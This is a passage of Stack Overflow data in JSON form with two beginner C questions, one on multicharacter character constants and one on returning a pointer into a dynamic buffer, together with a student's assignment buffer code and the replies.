"MemAllox", "link": "https://stackoverflow.com/users/9090821/memallox"}, "edited": false, "score": 0, "creation_date": 1518020542, "post_id": 48667552, "comment_id": 84334911, "body": "@MemAllox: That article is misleading in the sense that it implies that all the characters are packaged somehow. That doesn&#39;t have to be the case: an implementation is free to ignore all the characters after the first one, for example."}, {"owner": {"reputation": 353, "user_id": 9090821, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KgpAu.jpg?s=128&g=1", "display_name": "MemAllox", "link": "https://stackoverflow.com/users/9090821/memallox"}, "reply_to_user": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1518020773, "post_id": 48667552, "comment_id": 84335080, "body": "@Bathsheba Ok, so I guess I&#39;ll keep my fingers off those, thanks :D"}], "answers": [{"comments": [{"owner": {"reputation": 43, "user_id": 7779183, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/219d420edf7711a6eb20256d8a99ebac?s=128&d=identicon&r=PG&f=1", "display_name": "Curious", "link": "https://stackoverflow.com/users/7779183/curious"}, "edited": false, "score": 0, "creation_date": 1518017860, "post_id": 48667617, "comment_id": 84332974, "body": "I wasn&#39;t getting any warnings and ya only ane value can be stored in a character variable as such in a little endian machine, only the last byte is considered, am I right?"}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "reply_to_user": {"reputation": 43, "user_id": 7779183, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/219d420edf7711a6eb20256d8a99ebac?s=128&d=identicon&r=PG&f=1", "display_name": "Curious", "link": "https://stackoverflow.com/users/7779183/curious"}, "edited": false, "score": 1, "creation_date": 1518017904, "post_id": 48667617, "comment_id": 84333005, "body": "@Curious: Absolutely not."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "reply_to_user": {"reputation": 43, "user_id": 7779183, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/219d420edf7711a6eb20256d8a99ebac?s=128&d=identicon&r=PG&f=1", "display_name": "Curious", "link": "https://stackoverflow.com/users/7779183/curious"}, "edited": false, "score": 0, "creation_date": 1518017915, "post_id": 48667617, "comment_id": 84333015, "body": "@Curious, if you were not getting warnings then you should turn up the warning level or find a better compiler.  Any compiler worth using will warn about multi-character integer character constants."}], "tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": true, "score": 4, "last_activity_date": 1518018850, "last_edit_date": 1518018850, "creation_date": 1518017690, "answer_id": 48667617, "question_id": 48667552, "link": "https://stackoverflow.com/questions/48667552/why-does-this-c-program-print-the-character-2/48667617#48667617", "title": "Why does this C program print the character 2?", "body": "<p><code>'012'</code> is a multicharacter constant, which is an <code>int</code> type, but with an <em>implementation defined</em> value. (For the avoidance of doubt, <code>'0'</code> is an <code>int</code> type in C too.)</p>\n\n<p>If <code>char</code> is <code>unsigned</code> then you'll get the least significant <code>CHAR_BIT</code> bits of that <code>int</code> as the final result. If <code>char</code> is <code>signed</code>, then then behaviour of the conversion of that <code>int</code> to the <code>char</code> will be implementation defined.</p>\n\n<p>In your case, it appears that the constant value is <code>'0' * 256 * 256 + '1' * 256 + '2'</code>, and the conversion of this to <code>char</code> is effectively taking the result modulo 256.</p>\n"}, {"tags": [], "owner": {"reputation": 3334, "user_id": 4765864, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/2M2eC.jpg?s=128&g=1", "display_name": "gonczor", "link": "https://stackoverflow.com/users/4765864/gonczor"}, "is_accepted": false, "score": 0, "last_activity_date": 1518017821, "creation_date": 1518017821, "answer_id": 48667675, "question_id": 48667552, "link": "https://stackoverflow.com/questions/48667552/why-does-this-c-program-print-the-character-2/48667675#48667675", "title": "Why does this C program print the character 2?", "body": "<p>It's generally error which should be fixed. Look what comes out when I compile it with <code>-Wall</code> option:</p>\n\n<pre><code>gonczor@wiktor-papu:~/tmp$ gcc test.c -Wall -o test\ntest.c: In function \u2018main\u2019:\ntest.c:5:12: warning: multi-character character constant [-Wmultichar]\n     char c='012';\n            ^~~~~\ntest.c:5:12: warning: overflow in implicit constant conversion [-Woverflow]\ngonczor@wiktor-papu:~/tmp$ ./main \n31221344gonczor@wiktor-papu:~/tmp$ echo $?\n1\n</code></pre>\n\n<p>The last line <code>echo $?</code> prints last command exit status. You can see it's 1, not zero.</p>\n"}], "migrated_from": {"other_site": {"aliases": ["http://computerscience.stackexchange.com"], "markdown_extensions": ["MathJax", "Prettify"], "launch_date": 1439905020, "open_beta_date": 1332272936, "closed_beta_date": 1331060400, "site_state": "normal", "high_resolution_icon_url": "https://cdn.sstatic.net/Sites/cs/Img/apple-touch-icon@2.png", "favicon_url": "https://cdn.sstatic.net/Sites/cs/Img/favicon.ico", "icon_url": "https://cdn.sstatic.net/Sites/cs/Img/apple-touch-icon.png", "audience": "students, researchers and practitioners of computer science", "site_url": "https://cs.stackexchange.com", "api_site_parameter": "cs", "logo_url": "https://cdn.sstatic.net/Sites/cs/Img/logo.png", "name": "Computer Science", "site_type": "main_site"}, "on_date": 1518017530, "question_id": 87815}, "owner": {"reputation": 43, "user_id": 7779183, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/219d420edf7711a6eb20256d8a99ebac?s=128&d=identicon&r=PG&f=1", "display_name": "Curious", "link": "https://stackoverflow.com/users/7779183/curious"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 83, "favorite_count": 0, "accepted_answer_id": 48667617, "answer_count": 2, "score": -3, "last_activity_date": 1518018850, "creation_date": 1518016963, "last_edit_date": 1518017578, "question_id": 48667552, "link": "https://stackoverflow.com/questions/48667552/why-does-this-c-program-print-the-character-2", "title": "Why does this C program print the character 2?", "body": "<pre><code>int main(void)   \n{  \n    char c='012';  \n    printf(\"%c\",c);  \n    return 0;  \n}  \n</code></pre>\n\n<p>Why is 2 getting printed?</p>\n"}, {"tags": ["c", "pointers", "buffer"], "comments": [{"owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 0, "creation_date": 1518016608, "post_id": 48667173, "comment_id": 84332081, "body": "Testing for the compiler at runtime? Just check at compile time. Note that it doesn&#39;t make a lot of sense to check that at runtime."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518016613, "post_id": 48667173, "comment_id": 84332087, "body": "You can&#39;t return an address of a local variable (which function parameter is). Well, you can return it, but it would be useless as you can&#39;t dereference it."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518016638, "post_id": 48667173, "comment_id": 84332106, "body": "What exactly prevents you from doing as you require?  I mean, it sounds like a job for the address-of operator, <code>&amp;</code>.  Supposing that you mean a pointer into some location inside your <code>Buffer</code>, as opposed to a pointer to the function parameter."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518016696, "post_id": 48667173, "comment_id": 84332143, "body": "@JohnBollinger It&#39;s just that returning an address of a formal parameter is not a good idea :)"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518016738, "post_id": 48667173, "comment_id": 84332170, "body": "@EugeneSh. of course it&#39;s not, but I don&#39;t think that&#39;s what he actually wants to do."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518016770, "post_id": 48667173, "comment_id": 84332191, "body": "Well, I hope so..."}, {"owner": {"reputation": 52685, "user_id": 980550, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/8emhY.jpg?s=128&g=1", "display_name": "lurker", "link": "https://stackoverflow.com/users/980550/lurker"}, "edited": false, "score": 2, "creation_date": 1518016793, "post_id": 48667173, "comment_id": 84332208, "body": "That&#39;s an awful lot of code to wonder how to return a pointer to a buffer location. You should narrow it down to a simpler example."}, {"owner": {"reputation": 41, "user_id": 8600197, "user_type": "registered", "profile_image": "https://graph.facebook.com/10211725386742875/picture?type=large", "display_name": "Jack Loveday", "link": "https://stackoverflow.com/users/8600197/jack-loveday"}, "edited": false, "score": 0, "creation_date": 1518016888, "post_id": 48667173, "comment_id": 84332281, "body": "I guess I just forgot about <code>&amp;</code> operator, is there a differance from returning <code>*&amp;loc_offset</code> or <code>&amp;loc_offset</code> ?"}, {"owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 0, "creation_date": 1518016941, "post_id": 48667173, "comment_id": 84332323, "body": "You want to return a pointer to <code>loc_offset</code>? why? And <code>*&amp;loc_offset</code> does not make sense, also <code>return &amp;loc_offset;</code> is undefined behavior."}, {"owner": {"reputation": 41, "user_id": 8600197, "user_type": "registered", "profile_image": "https://graph.facebook.com/10211725386742875/picture?type=large", "display_name": "Jack Loveday", "link": "https://stackoverflow.com/users/8600197/jack-loveday"}, "reply_to_user": {"reputation": 52685, "user_id": 980550, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/8emhY.jpg?s=128&g=1", "display_name": "lurker", "link": "https://stackoverflow.com/users/980550/lurker"}, "edited": false, "score": 0, "creation_date": 1518016950, "post_id": 48667173, "comment_id": 84332332, "body": "@lurker I&#39;ve posted reduced code before and people complain they can&#39;t follow my code easily because I haven&#39;t included it all so figured I&#39;d save some time and just post it all :P"}, {"owner": {"reputation": 41, "user_id": 8600197, "user_type": "registered", "profile_image": "https://graph.facebook.com/10211725386742875/picture?type=large", "display_name": "Jack Loveday", "link": "https://stackoverflow.com/users/8600197/jack-loveday"}, "reply_to_user": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 0, "creation_date": 1518016983, "post_id": 48667173, "comment_id": 84332356, "body": "@IharobAlAsimi its required from me for this assignment. They want the distance between the head and the location of a character.."}, {"owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 1, "creation_date": 1518017034, "post_id": 48667173, "comment_id": 84332379, "body": "The &quot;<i>distance</i>&quot;? What is that? Isn&#39;t it <code>loc_offset</code> itself?"}, {"owner": {"reputation": 41, "user_id": 8600197, "user_type": "registered", "profile_image": "https://graph.facebook.com/10211725386742875/picture?type=large", "display_name": "Jack Loveday", "link": "https://stackoverflow.com/users/8600197/jack-loveday"}, "reply_to_user": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 0, "creation_date": 1518017148, "post_id": 48667173, "comment_id": 84332471, "body": "@IharobAlAsimi essentially yes, I basically want to be able to return a pointer to the location in the buffer at the end of <code>loc_offset</code> so if this is an array: [][][][][x][][] Head is always at the front correct? how do I get the location of x without hardcoding it as 4 in this example"}], "answers": [{"comments": [{"owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 3, "creation_date": 1518016883, "post_id": 48667309, "comment_id": 84332277, "body": "Note that <code>pBD-&gt;cb_head + loc_offset</code> is essentially the same."}, {"owner": {"reputation": 41, "user_id": 8600197, "user_type": "registered", "profile_image": "https://graph.facebook.com/10211725386742875/picture?type=large", "display_name": "Jack Loveday", "link": "https://stackoverflow.com/users/8600197/jack-loveday"}, "edited": false, "score": 0, "creation_date": 1518017992, "post_id": 48667309, "comment_id": 84333076, "body": "This was the correct solution, thanks everyone. Here is my final code snippet solution: <code>char * b_location(Buffer * const pBD, short loc_offset) { \tif (!pBD) \t\treturn NULL;  \tif (loc_offset &gt;= pBD-&gt;capacity) \t\treturn NULL;  \treturn &amp;(pBD-&gt;cb_head[loc_offset]); }</code>"}], "tags": [], "owner": {"reputation": 244, "user_id": 9177735, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c90311d812036b4debfcf7aa866dec22?s=128&d=identicon&r=PG&f=1", "display_name": "Ben", "link": "https://stackoverflow.com/users/9177735/ben"}, "is_accepted": true, "score": 1, "last_activity_date": 1518016842, "creation_date": 1518016842, "answer_id": 48667309, "question_id": 48667173, "link": "https://stackoverflow.com/questions/48667173/how-do-i-return-a-pointer-to-location-in-a-buffer/48667309#48667309", "title": "How do I return a pointer to location in a buffer?", "body": "<pre><code>char * b_location(Buffer * const pBD, short loc_offset) {\n    if (!pBD)\n        return NULL;\n\n    /* Make sure loc_offset doesn't go beyond the length of the array */\n    if( ! in_bounds )\n        return NULL;\n\n    return &amp;(pBD-&gt;cb_head[loc_offset]);\n}\n</code></pre>\n"}], "owner": {"reputation": 41, "user_id": 8600197, "user_type": "registered", "profile_image": "https://graph.facebook.com/10211725386742875/picture?type=large", "display_name": "Jack Loveday", "link": "https://stackoverflow.com/users/8600197/jack-loveday"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 549, "favorite_count": 0, "closed_date": 1518036414, "accepted_answer_id": 48667309, "answer_count": 1, "score": 1, "last_activity_date": 1518017229, "creation_date": 1518016436, "last_edit_date": 1518017229, "question_id": 48667173, "link": "https://stackoverflow.com/questions/48667173/how-do-i-return-a-pointer-to-location-in-a-buffer", "closed_reason": "Not suitable for this site", "title": "How do I return a pointer to location in a buffer?", "body": "<p>I'm currently working on a project in C which I'm required to create a buffer program. For the most part my program is finished but I'm just missing one required function: a location function to return the distance between the head (beginning of array) to the desired location designated by <code>short loc_offset</code>.\nGiven what I already have, how do I <strong>return a pointer to an index or location from my short?</strong>\nHere is my given and created code:\nMain (<code>plat_bt.c</code>):</p>\n\n<pre><code>/*  File name: platy_bt.c\n *  Purpose:This is the main program for Assignment #1, CST8152\n *  Version: 1.18.1\n *  Author: Svillen Ranev\n *  Date: 16 January 2018\n */   \n\n/* The #define _CRT_SECURE_NO_WARNINGS should be used in MS Visual Studio projects\n * to suppress the warnings about using \"unsafe\" functions like fopen()\n * and standard sting library functions defined in string.h.\n * The define directive does not have any effect on other compiler projects (gcc, Borland).\n */\n#define _CRT_SECURE_NO_WARNINGS\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdarg.h&gt;\n#include &lt;limits.h&gt;\n\n#include \"buffer.h\"\n\n/* constant definitions */\n#define INIT_CAPACITY 200 /* initial buffer capacity */\n#define INC_FACTOR 15       /* increment factor */\n\n/*check for ANSI C compliancy */\n#define ANSI_C 0\n#if defined(__STDC__)\n#undef ANSI_C\n#define ANSI_C 1\n#endif\n\n/*  Declaration of an error printing function with\n *  variable number of arguments\n */\nvoid err_printf(char *fmt, ...);\n/*  Declaration of a buffer contents display function */\nvoid display (Buffer *ptr_Buffer); \nlong get_filesize(char *fname);\n\nint main(int argc, char **argv){\n\n   pBuffer ptr_Buffer;   /* pointer to Buffer structure */\n   FILE *fi;             /* input file handle */\n   int loadsize = 0;     /*the size of the file loaded in the buffer */\n   int ansi_c = !ANSI_C; /* ANSI C compliancy flag */\n\n/* Check if the compiler option is set to compile ANSI C */\n/* __DATE__, __TIME__, __LINE__, __FILE__, __STDC__ are predefined preprocessor macros*/\n  if(ansi_c){\n    err_printf(\"Date: %s  Time: %s\",__DATE__, __TIME__);\n    err_printf(\"ERROR: Compiler is not ANSI C compliant!\\n\");\n    exit(1);\n  }\n\n/* missing file name or/and mode parameter */\n  if (argc &lt;= 2){\n\n     err_printf(\"\\nDate: %s  Time: %s\",__DATE__, __TIME__);\n     err_printf(\"\\nRuntime error at line %d in file %s\\n\", __LINE__, __FILE__);\n      err_printf(\"%s\\b\\b\\b\\b%s%s\",argv[0],\": \",\"Missing parameters.\");\n      err_printf(\"Usage: platybt source_file_name mode\");\n      exit(1);\n    }\n\n/* create a source code input buffer */     \n    switch(*argv[2]){\n     case 'f': case 'a': case 'm': break;\n     default:\n      err_printf(\"%s%s%s\",argv[0],\": \",\"Wrong mode parameter.\");\n      exit(1);\n    }\n/*create the input buffer */\n    ptr_Buffer = b_allocate(INIT_CAPACITY,INC_FACTOR,*argv[2]);\n    if (ptr_Buffer == NULL){\n        err_printf(\"%s%s%s\",argv[0],\": \",\"Cannot allocate buffer.\");\n        exit(1);\n    }\n\n/* open the source file */\n    if ((fi = fopen(argv[1],\"r\")) == NULL){\n        err_printf(\"%s%s%s%s\",argv[0],\": \", \"Cannot open file: \",argv[1]);\n        exit (1);\n    }\n\n/* load a source file into the input buffer  */\n     printf(\"Reading file %s ....Please wait\\n\",argv[1]);\n     loadsize = b_load (fi,ptr_Buffer);\n     if(loadsize == RT_FAIL1)\n       err_printf(\"%s%s%s\",argv[0],\": \",\"Error in loading buffer.\");\n\n/* close the source file */ \n    fclose(fi);\n/*find the size of the file  */\n    if (loadsize == LOAD_FAIL){\n     printf(\"The input file %s %s\\n\", argv[1],\"is not completely loaded.\");\n     printf(\"Input file size: %ld\\n\", get_filesize(argv[1]));\n    } \n\n/* display the contents of the input buffer */    \n   display(ptr_Buffer);\n\n/* compact the buffer\n * add end-of-file character (EOF) to the buffer\n * display again\n */\nif(!b_compact(ptr_Buffer,EOF)){         \n      err_printf(\"%s%s%s\",argv[0],\": \",\"Error in compacting buffer.\");\n  }  \n  display(ptr_Buffer); \n\n/* free the dynamic memory used by the buffer */  \n  b_free(ptr_Buffer);\n/* make the buffer invalid\n   It is not necessary here because the function terminates anyway,\n   but will prevent run-time errors and crashes in future expansions\n*/\n  ptr_Buffer = NULL;\n/*return success */\n  return (0);\n}\n\n/* error printing function with variable number of arguments*/\nvoid err_printf( char *fmt, ... ){\n/*Initialize variable list */   \n  va_list ap;\n  va_start(ap, fmt);\n\n  (void)vfprintf(stderr, fmt, ap);\n   va_end(ap);\n\n  /* Move to new line */\n  if( strchr(fmt,'\\n') == NULL )\n     fprintf(stderr,\"\\n\");\n}\n\nvoid display (Buffer *ptr_Buffer){\n  printf(\"\\nPrinting buffer parameters:\\n\\n\");\n  printf(\"The capacity of the buffer is:  %d\\n\",b_capacity(ptr_Buffer));\n  printf(\"The current size of the buffer is:  %d\\n\",b_limit(ptr_Buffer));\n  printf(\"The operational mode of the buffer is:   %d\\n\",b_mode(ptr_Buffer));\n  printf(\"The increment factor of the buffer is:  %lu\\n\",b_incfactor(ptr_Buffer));\n  printf(\"The current mark of the buffer is:  %d\\n\", b_mark(ptr_Buffer, b_limit(ptr_Buffer)));\n/*printf(\"The reallocation flag is:   %d\\n\",b_rflag(ptr_Buffer));*/\n  printf(\"\\nPrinting buffer contents:\\n\\n\");\n  b_rewind(ptr_Buffer);\n  b_print(ptr_Buffer);\n}\n\nlong get_filesize(char  *fname){\n   FILE *input;\n   long flength;\n   input = fopen(fname, \"r\");\n   if(input == NULL){\n      err_printf(\"%s%s\",\"Cannot open file: \",fname);  \n      return 0;\n   }\n   fseek(input, 0L, SEEK_END);\n   flength = ftell(input);   \n   fclose(input);\n   return flength;\n}\n</code></pre>\n\n<p>That main file has no errors or warnings, it was given to me to be used as my main.\nHere is my edited source file (<code>buffer.c</code>):</p>\n\n<pre><code>/*  File name: buffer.c\n *  Purpose: This is the main program for Assignment #01, CST8152\n *  Version: 1.0.3\n *  Author: Jack Loveday\n *  Date: 7 Febuary, 2018\n*/\n\n#define _CRT_SECURE_NO_WARNINGS\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdarg.h&gt;\n#include &lt;limits.h&gt;\n\n#include \"buffer.h\"\n\n/* b_allocate: Creates new buffer on heap\nTries to allocate memory for:\n- one Buffer (calloc)\n- one dynamic character buffer (char array) (malloc)\nSets buffer operational mode and inc factor\nCopies given init_capacity into Buffer capacity val */\nBuffer * b_allocate(short init_capacity, char inc_factor, char o_mode) {\n    Buffer *pBuffer;\n    if (init_capacity &lt; 0 || (unsigned char)inc_factor &lt; 0)\n        return NULL;\n\n    pBuffer = (Buffer *)calloc(1, sizeof(Buffer));\n    if (!pBuffer) {\n        free(pBuffer);\n        return NULL;\n    }\n\n    pBuffer-&gt;cb_head = (char *)malloc(init_capacity);\n    if (o_mode == 'f' || (unsigned char)inc_factor == 0) {\n        pBuffer-&gt;mode = 0;\n        pBuffer-&gt;inc_factor = 0;\n    }\n\n    else if (o_mode == 'a') {\n        pBuffer-&gt;mode = ADD_MODE;\n        pBuffer-&gt;inc_factor = (unsigned char)inc_factor;\n    }\n\n    else if (o_mode == 'm' &amp;&amp; (unsigned char)inc_factor &lt;= 100) {\n        pBuffer-&gt;mode = MULTI_MODE;\n        pBuffer-&gt;inc_factor = (unsigned char)inc_factor;\n    }\n\n    else {\n        free(pBuffer-&gt;cb_head);\n        free(pBuffer);\n        return NULL;\n    }\n\n    pBuffer-&gt;capacity = init_capacity;\n    return pBuffer;\n}\n\n/* b_addc: resets r_flag to 0 &amp; tries to add symbol to char array pointed by pBD */\npBuffer b_addc(pBuffer const pBD, char symbol) {\n    char *tBuffer;\n    short aSpace = 0, newInc = 0, newCapacity = 0;\n    if (!pBD)\n        return NULL;\n\n    pBD-&gt;r_flag = 0;\n    if ((short)(pBD-&gt;addc_offset * sizeof(char)) &lt; pBD-&gt;capacity) {\n        pBD-&gt;cb_head[pBD-&gt;addc_offset] = symbol;\n        pBD-&gt;addc_offset++;\n    }\n\n    else if ((short)(pBD-&gt;addc_offset * sizeof(char)) == pBD-&gt;capacity) {\n        if (pBD-&gt;mode == 0)\n            return NULL;\n\n        else if (pBD-&gt;mode == 1) {\n            newCapacity = pBD-&gt;capacity + (unsigned char)pBD-&gt;inc_factor * sizeof(char);\n            if (newCapacity &lt;= 0)\n                return NULL;\n\n            pBD-&gt;capacity = newCapacity;\n        }\n\n        else if (pBD-&gt;mode == -1) {\n            if (pBD-&gt;capacity == SHRT_MAX)\n                return NULL;\n\n            else {\n                aSpace = SHRT_MAX - pBD-&gt;capacity;\n                newInc = (short)((aSpace * pBD-&gt;inc_factor) / 100);\n                if (!newInc)\n                    newInc = NEW_ONE;\n\n                newCapacity = (short)((pBD-&gt;capacity + newInc));\n                if (newCapacity &lt;= 0)\n                    newCapacity = SHRT_MAX;\n            }\n        }\n\n        tBuffer = (char *)realloc(pBD-&gt;cb_head, newCapacity);\n        if (tBuffer != pBD-&gt;cb_head)\n            pBD-&gt;r_flag = SET_R_FLAG;\n\n        pBD-&gt;cb_head = tBuffer;\n        pBD-&gt;cb_head[pBD-&gt;addc_offset] = symbol;\n        pBD-&gt;addc_offset++;\n        pBD-&gt;capacity = newCapacity;\n    }\n    return pBD;\n\n}\n\n/* b_clear: retains memory space currently allocated to buffer, but\nre-initializes all appropriate members of given Buffer */\nint b_clear(Buffer * const pBD){\n    if (!pBD)\n        return RT_FAIL1;\n\n    pBD-&gt;capacity = 0;\n    pBD-&gt;addc_offset = 0;\n    pBD-&gt;getc_offset = 0;\n    pBD-&gt;eob = 0;\n    return 1;\n}\n\n/* b_free: de-allocates memory for char array &amp; Buffer struct */\nvoid b_free(Buffer * const pBD) {\n    if (pBD) {\n        free(pBD-&gt;cb_head);\n        free(pBD);\n    }\n}\n\n/* b_isfull: returns 1 if buffer is full, otherwise returns 0, if rt error return -1 */\nint b_isfull(Buffer * const pBD) {\n    if (!pBD)\n        return RT_FAIL1;\n\n    if ((short)(pBD-&gt;addc_offset * sizeof(char)) == pBD-&gt;capacity)\n        return 1;\n\n    else\n        return 0;\n}\n\n/* b_limit: returns current limit of buffer, return -1 on error */\nshort b_limit(Buffer * const pBD) {\n    if (!pBD)\n        return RT_FAIL1;\n\n    return pBD-&gt;addc_offset;\n}\n\n/* b_capacity: returns current capacity of buffer, return -1 on error */\nshort b_capacity(Buffer * const pBD) {\n    if (!pBD)\n        return RT_FAIL1;\n\n    return pBD-&gt;capacity;\n}\n\n/* b_mark: sets markc_offset to mark, must be between 0 and addc_offset, return -1 on error */\nshort b_mark(pBuffer const pBD, short mark) {\n    if (!pBD || mark &lt; 0 || mark &gt; pBD-&gt;addc_offset)\n        return RT_FAIL1;\n\n    pBD-&gt;markc_offset = mark;\n    return pBD-&gt;markc_offset;\n}\n\n/* b_mode: returns value of mode, or -1 on error */\nint b_mode(Buffer * const pBD) {\n    if (!pBD)\n        return RT_FAIL1;\n\n    return pBD-&gt;mode;\n}\n\n/* b_infactor: returns non-negative value of inc_factor, return 0x100 (256) */\nsize_t b_incfactor(Buffer * const pBD) {\n    if (!pBD)\n        return NEW_FULL;\n\n    return (unsigned char)pBD-&gt;inc_factor;\n}\n\n/* b_load: returns value of mode */\nint b_load(FILE * const fi, Buffer * const pBD) {\n    char c;\n    int cNum = 0;\n    if (!fi || !pBD)\n        return RT_FAIL1;\n\n    for (;;) {\n        c = (char)fgetc(fi);\n        if (feof(fi))\n            break;\n\n        if (!b_addc(pBD, c))\n            return LOAD_FAIL;\n\n        ++cNum;\n    }\n\n    fclose(fi);\n    return cNum;\n}\n\n/* b_isempty: if addc_offset is 0 return 1, otherwise return 0, return -1 on error */\nint b_isempty(Buffer * const pBD) {\n    if (!pBD)\n        return RT_FAIL1;\n\n    if (!pBD-&gt;addc_offset)\n        return 1;\n\n    else\n        return 0;\n}\n\n/* b_eob: returns eob (end of buffer), returns -1 on error */\nint b_eob(Buffer * const pBD) {\n    if (!pBD)\n        return RT_FAIL1;\n\n    return pBD-&gt;eob;\n}\n\n/* b_getc: checks logic, if not valid returns -2, if getc_offset and addc_offset\nare equal, set eob to 1 and returns -1, otherwise set eob to 0 */\nchar b_getc(Buffer * const pBD) {\n    char returner;\n    if (!pBD || !pBD-&gt;cb_head)\n        return RT_FAIL2;\n\n    if (pBD-&gt;getc_offset == pBD-&gt;addc_offset) {\n        pBD-&gt;eob = 1;\n        return RT_FAIL1;\n    }\n\n    else {\n        pBD-&gt;eob = 0;\n    }\n\n    returner = *(pBD-&gt;cb_head + pBD-&gt;getc_offset);\n    pBD-&gt;getc_offset++;\n    return returner;\n}\n\n/* b_print: used for diagnostic purposes only, returns -1 on error */\nint b_print(Buffer * const pBD) {\n    int numOfChars = 0;\n    char c;\n    if (!pBD-&gt;addc_offset) {\n        